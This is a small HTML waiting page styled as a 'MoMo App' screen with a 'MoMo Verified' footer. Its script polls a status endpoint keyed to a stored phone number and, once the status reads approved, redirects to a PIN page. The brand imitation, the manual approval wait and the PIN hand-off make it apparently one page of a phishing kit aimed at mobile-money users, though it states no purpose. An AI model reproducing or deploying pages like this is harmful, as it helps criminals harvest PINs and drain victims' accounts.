<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Processing</title>

<style>
body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: #0b5c6b;
  color: white;
  text-align: center;
}

.header {
  padding: 20px;
  font-size: 20px;
  font-weight: bold;
  color: #ffcc00;
}

.container {
  margin-top: 80px;
}

.loader {
  margin-top: 20px;
  font-size: 14px;
}

.footer {
  position: fixed;
  bottom: 10px;
  width: 100%;
  font-size: 12px;
}
</style>
</head>

<body>

<div class="header">
  MoMo App
</div>

<div class="container">
  <h2 id="statusText">⏳ Processing your request...</h2>
  <div class="loader">Please wait for approval</div>
</div>

<div class="footer">
  2026@MoMo Verified
</div>

<script>
const phone = localStorage.getItem("phone");

if (!phone) {
  window.location.href = "/";
}

let checking = true; // control loop

async function checkStatus() {
  if (!checking) return;

  try {
    const url = window.location.origin + "/status/" + phone;
    const res = await fetch(url);

    if (!res.ok) throw new Error();

    const data = await res.json();

    if (data.status === "pending") {
      document.getElementById("statusText").innerText = "⏳ Waiting for approval...";
    }

    else if (data.status === "approved") {
      // ✅ STOP LOOP
      checking = false;

      document.getElementById("statusText").innerText = "✅ Approved! Redirecting...";

      setTimeout(() => {
        window.location.href = "/pin.html";
      }, 1500);
    }

    else if (data.status === "declined") {
      checking = false;
      document.getElementById("statusText").innerText = "❌ Application Declined";
    }

  } catch (err) {
    if (checking) {
      document.getElementById("statusText").innerText = "⚠️ Network error... retrying";
    }
  }
}

// run loop
setInterval(checkStatus, 3000);
checkStatus();
</script>
